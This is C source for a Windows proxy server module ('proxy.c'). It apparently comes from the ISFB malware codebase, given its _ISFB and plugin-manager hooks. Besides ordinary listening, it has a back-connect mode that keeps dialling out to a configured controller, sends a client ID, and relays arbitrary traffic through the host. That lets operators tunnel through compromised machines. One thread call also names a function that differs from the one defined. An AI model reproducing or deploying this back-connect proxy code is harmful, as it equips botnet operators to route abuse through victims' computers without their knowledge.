//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// PROXY project. Version 1.3
//	
// module: proxy.c
// $Revision: 65 $
// $Date: 2014-12-19 18:43:16 +0300 (Пт, 19 дек 2014) $
// description:
//	Proxy server main code module.

#include "..\common\common.h"
#include <mstcpip.h>
#include "proxy.h"

//
//	Shuts down the specified socket. Stops all pending operations.
//
VOID ProxyShutdownSocket(
	SOCKET*	pSocket
	)
{
	SOCKET	Socket;

	if ((Socket = (SOCKET)InterlockedExchangePointer((PVOID)pSocket, (LONG_PTR)INVALID_SOCKET)) != INVALID_SOCKET)
	{
		_tshutdown(Socket, SD_BOTH);
		_tclosesocket(Socket);
	}
}


//
//	Shuts down and closes the specified session Client and Target sockets which forces the session to terminate.
//
static VOID SessionCloseSockets(
	PPROXY_SESSION	pSession
	)
{
	ASSERT_PROXY_SESSION(pSession);

	ProxyShutdownSocket(&pSession->ClientSocket);
	ProxyShutdownSocket(&pSession->TargetSocket);
}


//
//	Releases the specified proxy session, frees resources.
//
static VOID ProxyReleaseSession(
	PPROXY_SESSION	pSession	// pointer to the session to release
	)
{
	ASSERT_PROXY_SESSION(pSession);

	SessionCloseSockets(pSession);
	
#ifndef _USE_WORK_ITEMS
	if (pSession->Thread)
	{
		if (pSession->ThreadId != GetCurrentThreadId())
			WaitForSingleObject(pSession->Thread, INFINITE);
		CloseHandle(pSession->Thread);
	}
#endif

	if (pSession->pClientBuffer)
		vFree(pSession->pClientBuffer);
	if (pSession->pTargetBuffer)
		vFree(pSession->pTargetBuffer);

#if _DEBUG
	pSession->Magic = 0;
#endif

	AppFree(pSession);
}


//
//	Proxy session worker thread.
//
static WINERROR WINAPI	ProxySessionThread(
	PPROXY_SESSION	pSession
	)
{
	WINERROR Status = ERROR_UNSUCCESSFULL;
	LONG	bRead, bSent, NbIo = TRUE, Timeout = PROXY_RECEIVE_TIMEOUT;
	PPROXY_SERVER	pServer = pSession->pServer;
	TCP_KEEPALIVE	Keepalive = {TRUE, KEEPALIVE_TIME, KEEPALIVE_INTERVAL};
	ULONG	Size = 0;

	ASSERT_PROXY_SESSION(pSession);
	ASSERT_PROXY_SERVER(pServer);
	
	do	// not a loop
	{
		// Setting timeout for blocking receive calls
		if (_tsetsockopt(pSession->ClientSocket, SOL_SOCKET, SO_RCVTIMEO, (PCHAR)&Timeout, sizeof(LONG)))
			break;
Handshake:
		if ((Status = pServer->HandshakeFunction(pSession)) != NO_ERROR)
			// Handshake failed.
			break;

		ASSERT(pSession->TargetSocket);

		if (!pSession->pClientBuffer && !(pSession->pClientBuffer = vAlloc(PROXY_SESSION_BUFFER_SIZE)))
		{
			DbgPrint("PROXY: Not enough memory to allocate ClientBuffer, error: %u", GetLastError());
			break;
		}

		if (!pSession->pTargetBuffer && !(pSession->pTargetBuffer = vAlloc(PROXY_SESSION_BUFFER_SIZE)))
		{
			DbgPrint("PROXY: Not enough memory to allocate TargetBuffer, error: %u", GetLastError());
			break;
		}


		// Enabling non-blocking mode for sockets
		if (_tioctlsocket(pSession->ClientSocket, FIONBIO, &NbIo))
			break;

		if (_tioctlsocket(pSession->TargetSocket, FIONBIO, &NbIo))
			break;

#ifdef	_ENABLE_KEEPALIVE
		// Enabling TCP/IP keepalive option, setting timeout and interval
		if (WSAIoctl(pSession->TargetSocket, SIO_KEEPALIVE_VALS, &Keepalive, sizeof(TCP_KEEPALIVE), NULL, 0, &Size, NULL, NULL))
			break;
#endif

		// Proxy session main loop.
		// Reads a data from the ClientSocket and sends it to the TargetSocket and vice versa.
		// Terminates in case of an error.
		do	
		{
			BOOL	bSet = FALSE;
			struct	fd_set FdRecv;
			struct	fd_set FdSend;

			FD_ZERO(&FdRecv);
			FD_ZERO(&FdSend);

			FD_SET(pSession->TargetSocket, &FdRecv);
			FD_SET(pSession->ClientSocket, &FdRecv);
			FD_SET(pSession->TargetSocket, &FdSend);
			FD_SET(pSession->ClientSocket, &FdSend);

			if (_tselect(0, NULL, &FdSend, NULL, NULL) == SOCKET_ERROR)
			{
				Status = GetLastError();
				DbgPrint("PROXY: Select 1 failed with status %u\n", Status);
				break;
			}

			if (_tselect(0, &FdRecv, NULL, NULL, NULL) == SOCKET_ERROR)
			{
				Status = GetLastError();
				DbgPrint("PROXY: Select 2 failed with status %u\n", Status);
				break;
			}

			if (FD_ISSET(pSession->ClientSocket, &FdSend) && FD_ISSET(pSession->TargetSocket, &FdRecv))
			{
				if ((bRead = _trecv(pSession->TargetSocket, pSession->pTargetBuffer, PROXY_SESSION_BUFFER_SIZE, 0)) > 0)
				{
					bSent = _tsend(pSession->ClientSocket, pSession->pTargetBuffer, bRead, 0);

					if (bSent < 0 && (Status = GetLastError()) != WSAEWOULDBLOCK)
					{
						DbgPrint("PROXY: Send on ClientSocket ended with %x, error: %u\n", bSent, Status);
						break;
					}
					else
					{
						ASSERT(bSent == bRead);
#if _DEBUG
						pSession->SentToClient += bSent;
#endif
					}
				}
				else
				{
					// Target closed the connection
					DbgPrint("PROXY: Recv on TargetSocket ended with %x, error: %u\n", bRead, GetLastError());
					break;
				}
				bSet = TRUE;
			}	// if (FD_ISSET(pSession->ClientSocket, &FdSend) && FD_ISSET(pSession->TargetSocket, &FdRecv))

			if (FD_ISSET(pSession->TargetSocket, &FdSend) && FD_ISSET(pSession->ClientSocket, &FdRecv))
			{
				// Checking if there's a HTTP-proxy sends other request within the same connection
				if (pSession->bRepeatHandshake)
				{
					// Reading proxy version 
					if ((Status = (pServer->VersionFunction)(pSession, pSession->ClientSocket)) == NO_ERROR)
					{
						// Closing target connection
						ProxyShutdownSocket(&pSession->TargetSocket);
						// Performing new proxy handshake
						goto Handshake;
					}
					else
						break;
				}	// if (pSession->bRepeatHandshake)

				if ((bRead = _trecv(pSession->ClientSocket, pSession->pClientBuffer, PROXY_SESSION_BUFFER_SIZE, 0)) > 0)
				{
#if _DEBUG
					pSession->ReceivedFromClient += bRead;
#endif
					bSent = _tsend(pSession->TargetSocket, pSession->pClientBuffer, bRead, 0);

					if (bSent < 0 && (Status = GetLastError()) != WSAEWOULDBLOCK)
					{
						DbgPrint("PROXY: Send on TargetSocket ended with %x, error: %u\n", bSent, Status);
						break;
					}
					else
					{
						ASSERT(bSent == bRead);
					}
				}
				else
				{
					// Target closed the connection
					DbgPrint("PROXY: Recv on ClientSocket ended with %x, error: %u\n", bRead, GetLastError());
					break;
				}
				bSet = TRUE;
			}	// if (FD_ISSET(pSession->ClientSocket, 

			if (!bSet)
			{
				ASSERT(FdRecv.fd_count == 1 && FdSend.fd_count == 1);
				ASSERT(FdRecv.fd_array[0] == FdSend.fd_array[0]);

				if (FdSend.fd_array[0] == pSession->TargetSocket)
				{
					FdSend.fd_array[0] = pSession->ClientSocket;
					FdRecv.fd_array[0] = pSession->ClientSocket;
				}
				else
				{
					FdSend.fd_array[0] = pSession->TargetSocket;
					FdRecv.fd_array[0] = pSession->TargetSocket;
				}

				if (_tselect(0, &FdRecv, &FdSend, NULL, NULL) == SOCKET_ERROR)
				{
					Status = GetLastError();
					DbgPrint("PROXY: Select 3 failed with status %u\n", Status);
					break;
				}
			}	// if (!bSet)
		
		} while(TRUE);
			
	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	// Releasing proxy session
	EnterCriticalSection(&pServer->SessionListLock);
	RemoveEntryList(&pSession->Entry);
#if _DEBUG
	pServer->NumberOfSessions -= 1;
#endif
	LeaveCriticalSection(&pServer->SessionListLock);

	DbgPrint("PROXY: Session %x terminated. %u bytes received, %u bytes sent to a client\n", pSession->ClientSocket, pSession->ReceivedFromClient, pSession->SentToClient);

	ProxyReleaseSession(pSession);

	return(Status);
}



//
//	Accepts the specified connection, creates new proxy session.
//
static WINERROR ProxyAccept(
	PPROXY_SERVER	pServer,	// pointer to the server 
	SOCKET			sSocket,	// socket that received(created) the connection
	SOCKADDR_IN*	sAddr		// an address of connected host
	)
{
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;
	PPROXY_SESSION	pSession = NULL;
	TCP_KEEPALIVE	Keepalive = {TRUE, KEEPALIVE_TIME, KEEPALIVE_INTERVAL};
	ULONG	Timeout = PROXY_HANDSHAKE_TIMEOUT;
	ULONG	Size = 0;
	
	// Performing request source address check here
	DbgPrint("PROXY: %u.%u.%u.%u:%u connected.\n", sAddr->sin_addr.S_un.S_un_b.s_b1, sAddr->sin_addr.S_un.S_un_b.s_b2, sAddr->sin_addr.S_un.S_un_b.s_b3, sAddr->sin_addr.S_un.S_un_b.s_b4, htons(sAddr->sin_port));

	do 
	{
		if (!(pSession = AppAlloc(sizeof(PROXY_SESSION))))
			break;		
		memset(pSession, 0, sizeof(PROXY_SESSION));

#if _DEBUG
		pSession->Magic = PROXY_SESSION_MAGIC;
#endif		
		InitializeListHead(&pSession->Entry);

		pSession->ClientSocket = INVALID_SOCKET;
		pSession->TargetSocket = INVALID_SOCKET;
		pSession->pServer = pServer;

#ifdef	_ENABLE_KEEPALIVE
		// Enabling TCP/IP keepalive option, setting timeout and interval
		if (WSAIoctl(sSocket, SIO_KEEPALIVE_VALS, &Keepalive, sizeof(TCP_KEEPALIVE), NULL, 0, &Size, NULL, NULL))
			break;
#endif

#ifdef _BC_CLIENT
		// Check if we are in BC mode
		if (pServer->ServerAddress.sin_addr.S_un.S_addr)
		{
			// Setting timeout for blocking receive calls
			if (_tsetsockopt(sSocket, SOL_SOCKET, SO_RCVTIMEO, (PCHAR)&Timeout, sizeof(LONG)))
				break;
		}
#endif
		// Reading proxy version 
		if ((Status = (pServer->VersionFunction)(pSession, sSocket)) != NO_ERROR)
			break;

		pSession->ClientSocket = sSocket;

		// Insert newly created session into the session list
		EnterCriticalSection(&pServer->SessionListLock);

#ifdef _USE_WORK_ITEMS
		if (QueueUserWorkItem(ProxySessionThread, pSession, WT_EXECUTELONGFUNCTION))
		{
			InsertTailList(&pServer->SessionListHead, &pSession->Entry);
			Status = NO_ERROR;
#if _DEBUG
			pServer->NumberOfSessions += 1;
#endif
		}
		else
			Status = GetLastError();
#else
		// Creating session worker thread
		if (pSession->Thread = CreateThread(NULL, 0, SocksSessionThread, pSession, 0, &pSession->ThreadId))
		{
			InsertTailList(&pServer->SessionListHead, &pSession->Entry);
			Status = NO_ERROR;
#if _DEBUG
			pServer->NumberOfSessions += 1;
#endif
		}
		else
			Status = GetLastError();
#endif
		LeaveCriticalSection(&pServer->SessionListLock);

	} while(FALSE);


	if (Status != NO_ERROR && (pSession))
		ProxyReleaseSession(pSession);

	return(Status);
}


//
//	Proxy server control thread.
//
static WINERROR WINAPI ProxyControlThread(
	PPROXY_SERVER pServer
	)
{
	WINERROR	Status = NO_ERROR;
	ULONG		Attempts = 0;
#if (defined(_ISFB) && !defined(_VNC))
	BOOL		bNotify = FALSE;
#endif

	ENTER_WORKER();

	DbgPrint("PROXY: Control thread 0x%x started\n", GetCurrentThreadId());

	ASSERT_PROXY_SERVER(pServer);
	ASSERT(pServer->ControlThreadId == GetCurrentThreadId());

	if (pServer->hServerMutex)
		WaitForSingleObject(pServer->hServerMutex, INFINITE);
	
	// Checking if there's an IP address specified.
	// This means we are working in Back-Connection mode unstead of Incomming Connection mode.
	if (pServer->ServerAddress.sin_addr.S_un.S_addr)
	{
		// Working in BC mode
		SOCKADDR_IN	BcServerAddr;
		
		_tclosesocket(pServer->ControlSocket);
		// Saving BC-Server address for future use
		memcpy(&BcServerAddr, &pServer->ServerAddress, sizeof(SOCKADDR_IN));

		do 
		{
			if ((pServer->ControlSocket = _tsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET)
			{
				DbgPrint("PROXY: Connecting to BC server %u.%u.%u.%u:%u\n", BcServerAddr.sin_addr.S_un.S_un_b.s_b1, BcServerAddr.sin_addr.S_un.S_un_b.s_b2, BcServerAddr.sin_addr.S_un.S_un_b.s_b3, BcServerAddr.sin_addr.S_un.S_un_b.s_b4, htons(BcServerAddr.sin_port));
		
				// Connecting to the BC server port
				if (!_tconnect(pServer->ControlSocket, (struct sockaddr*)&pServer->ServerAddress, sizeof(SOCKADDR_IN)))
				{
#ifdef _BC_CLIENT
					if ((Status = BcSendClientId(pServer->ControlSocket, pServer->pClientId)) == NO_ERROR)
#endif
					{
#if (defined(_ISFB) && !defined(_VNC))
						// Notify plugin manager about a connection established
						if (!bNotify)
						{
							PlgNotify(PLG_ID_PROXY, PLG_ACTION_START, NO_ERROR);
							bNotify = TRUE;
						}
#endif
						// Starting proxy session 
						if ((Status = ProxyAccept(pServer, pServer->ControlSocket, &pServer->ServerAddress)) != NO_ERROR)
						{
							DbgPrint("PROXY: BC session failed, status: %u\n", Status);
						}
						else
							Attempts = 0;
					}	// if ((Status = BcSendClientId(pServer->ControlSocket, pServer->pClientId)) == NO_ERROR)
#ifdef _BC_CLIENT
					else
					{
						DbgPrint("PROXY: BC send client ID failed, status: %u\n", Status);
					}
#endif
				}	// if (!_tconnect(pServer->ControlSocket, (struct sockaddr*)&pServer->ServerAddress, sizeof(SOCKADDR_IN)))
				else
				{
					Status = GetLastError();
					DbgPrint("PROXY: Connecting to BC server failed, status: %u\n", Status);
				}

				if (Status != NO_ERROR)
					ProxyShutdownSocket(&pServer->ControlSocket);
			}	// if ((pServer->ControlSocket = _tsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) != INVALID_SOCKET)
			else
			{
				Status = GetLastError();
				DbgPrint("PROXY: Creating BC session socket failed, status: %u\n", Status);
			}

			if (Status != NO_ERROR)
			{
#if (defined(_ISFB) && !defined(_VNC))
				if (bNotify)
				{
					PlgNotify(PLG_ID_PROXY, PLG_ACTION_STOP, Status);
					bNotify = FALSE;
				}
#endif
				// Next attempt
				if ((Attempts += 1) == PROXY_CONNECT_ATTEMPTS)
				{
					WaitForSingleObject(pServer->hShutdownEvent, PROXY_WAIT_BC_TIMEOUT);
					Attempts = 0;
				}
			}	// if (Status != NO_ERROR)

		} while((WaitForSingleObject(pServer->hShutdownEvent, 0) == WAIT_TIMEOUT));
	}	// if (pServer->ServerAddress.sin_addr.S_un.S_addr)
	else
	{
		// Working in IC mode
		if (!_tbind(pServer->ControlSocket, (struct sockaddr*)&pServer->ServerAddress, sizeof(SOCKADDR_IN)))
		{
			SOCKET		aSocket;
			SOCKADDR_IN	aAddr;
			ULONG	AddrLen = sizeof(SOCKADDR_IN);

			if (!_tlisten(pServer->ControlSocket, SOMAXCONN))
			{
				while ((aSocket = _taccept(pServer->ControlSocket, (struct sockaddr*)&aAddr, &AddrLen)) != INVALID_SOCKET)
				{
 					if (ProxyAccept(pServer, aSocket, &aAddr) != NO_ERROR)
						_tclosesocket(aSocket);
				}
			}	// if (!_tlisten(pServer->ControlSocket, SOMAXCONN))
		}	// if (!_tbind(pServer->ControlSocket, (struct sockaddr*)&pServer->ServerAddress, sizeof(SOCKADDR_IN)))

		Status = GetLastError();
	}

	if (pServer->hServerMutex)
		ReleaseMutex(pServer->hServerMutex);

	DbgPrint("PROXY: Control thread terminated with status %u.\n", Status);

	LEAVE_WORKER();

	return(Status);
}

	
//
//	Reads the specified exact amount of data from the specified socket.
//
WINERROR ProxyReadSocket(
	SOCKET	Socket,		// socket to read from
	PCHAR	Buffer,		// buffer to write data to
	LONG	bSize		// size of the buffer in bytes (number of bytes to read)
	)
{
	WINERROR Status = NO_ERROR;
	LONG	 bRead;

	ASSERT(bSize);

	do 
	{
		bRead = _trecv(Socket, Buffer, bSize, 0);
		if (bRead == 0)
		{
			Status = ERROR_CONNECTION_ABORTED;
			break;
		}

		if (bRead == SOCKET_ERROR)
		{
			if ((Status = GetLastError()) == WSAEWOULDBLOCK)
			{
				Sleep(100);
				Status = NO_ERROR;
				continue;
			}
			break;
		}	// if (bRead == SOCKET_ERROR)

		bSize -= bRead;
		Buffer += bRead;
	} while(bSize);

	return(Status);
}

// ---- Proxy server startup and cleanup routines --------------------------------------------------------------------------


//
//	Starts the proxy server.
//
WINERROR ProxyStartServer(
	PVOID*					pServerHandle,		// receives proxy server handle
	SOCKADDR_IN*			pServerAddress,		// specifies BC-server address or, if no IP specified, AC-server port
	HANDLE					hServerMutex,		// handle to a mutex object wich will be held until the server stops
	LPSTR					pClientId,			// client ID string
	PROXY_VERSION_FUNC		pVersionFunction,	// version check function pointer
	PROXY_HANDSHAKE_FUNC	pHandshakeFunction	// handshake function pointer
	)
{
	WINERROR	Status;
	BOOL		bWsaStarted = FALSE;
	PPROXY_SERVER	pServer;
#ifndef _USE_KIP
	WSADATA		WsaData;
#endif

	do	// not a loop
	{
#ifndef _BC_GENERATE_ID
		if (pClientId == NULL)
		{
			Status = ERROR_INVALID_PARAMETER;
			break;
		}
#endif
#ifndef _USE_KIP
		if ((Status = WSAStartup(0x202, &WsaData)) != NO_ERROR)
			break;
#endif
		bWsaStarted = TRUE;

		if (!(pServer = AppAlloc(sizeof(PROXY_SERVER))))
		{
			Status = ERROR_NOT_ENOUGH_MEMORY;
			break;
		}

		memset(pServer, 0, sizeof(PROXY_SERVER));
#if _DEBUG
		pServer->Magic = PROXY_SERVER_MAGIC;
#endif
		memcpy(&pServer->ServerAddress, pServerAddress, sizeof(SOCKADDR_IN));
		InitializeCriticalSection(&pServer->SessionListLock);
		InitializeListHead(&pServer->SessionListHead);
		pServer->ControlSocket = INVALID_SOCKET;

		Status = ERROR_UNSUCCESSFULL;

		if (!(pServer->hShutdownEvent = CreateEvent(NULL, TRUE, FALSE, NULL)))
			break;

		if (!(pServer->hServerMutex = hServerMutex))
		{
			if (!(pServer->hServerMutex = pServer->hControlMutex = CreateMutex(NULL, FALSE, NULL)))
				break;
		}

		if (pClientId)
			pServer->pClientId = StrDupA(pClientId);

		pServer->VersionFunction = pVersionFunction;
		pServer->HandshakeFunction = pHandshakeFunction;

		if ((pServer->ControlSocket = _tsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
			break;

		if (!(pServer->ControlThread = CreateThread(NULL, 0, &ProxyControlThread, pServer, 0, &pServer->ControlThreadId)))
			break;

		*pServerHandle = pServer;
		Status = NO_ERROR;

	} while(FALSE);

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	if (Status != NO_ERROR && bWsaStarted)
	{
		ProxyStopServer(pServer);
#ifndef _USE_KIP
		WSACleanup();
#endif
	}

	return(Status);
}


//
//	Stops the proxy server. Cleans up all structures.
//
VOID ProxyStopServer(
	PVOID	ServerHandle	// Proxy server handle returned by ProxyStartServer() function
	)
{
	PLIST_ENTRY		pEntry;
	PPROXY_SERVER	pServer = (PPROXY_SERVER)ServerHandle;

	if (pServer)
	{
		ASSERT_PROXY_SERVER(pServer);

		if (pServer->hShutdownEvent)
		{
			SetEvent(pServer->hShutdownEvent);

			// Terminating connection and cleaning up the control socket
			ProxyShutdownSocket(&pServer->ControlSocket);

			if (pServer->ControlThread)
			{
				DbgPrint("PROXY: Waiting for the control thread to stop\n");
				// We cannot just wait on the thread object to stop here. Because if this function called from a DLLMain it 
				//	will never stop because of LdrLoaderLock held.
				// So we wait for the server control mutex.
				WaitForSingleObject(pServer->hServerMutex, INFINITE);
				CloseHandle(pServer->ControlThread);
			}

			if (pServer->hControlMutex)
				// Closing the server control mutex
				CloseHandle(pServer->hControlMutex);

			// Terminating all active sessions
			EnterCriticalSection(&pServer->SessionListLock);
			pEntry = pServer->SessionListHead.Flink;

			while(pEntry != &pServer->SessionListHead)
			{
				PPROXY_SESSION	pSession = CONTAINING_RECORD(pEntry, PROXY_SESSION, Entry);
				pEntry = pEntry->Flink;

				SessionCloseSockets(pSession);
			}	// while(pEntry != &g_SocksServer->SessionListHead)

			LeaveCriticalSection(&pServer->SessionListLock);

			// Waiting for the session list to empty 
			while(!IsListEmpty(&pServer->SessionListHead))
				Sleep(500);
#ifndef	_ISFB
			WaitForWorkers();
#endif
			CloseHandle(pServer->hShutdownEvent);

			if (pServer->pClientId)
				LocalFree(pServer->pClientId);
		}	// if (pServer->ShutdownEvent)

		DeleteCriticalSection(&pServer->SessionListLock);
#if _DEBUG
		pServer->Magic = ~PROXY_SERVER_MAGIC;
#endif
		AppFree(pServer);
	}	// if (pServer)
}
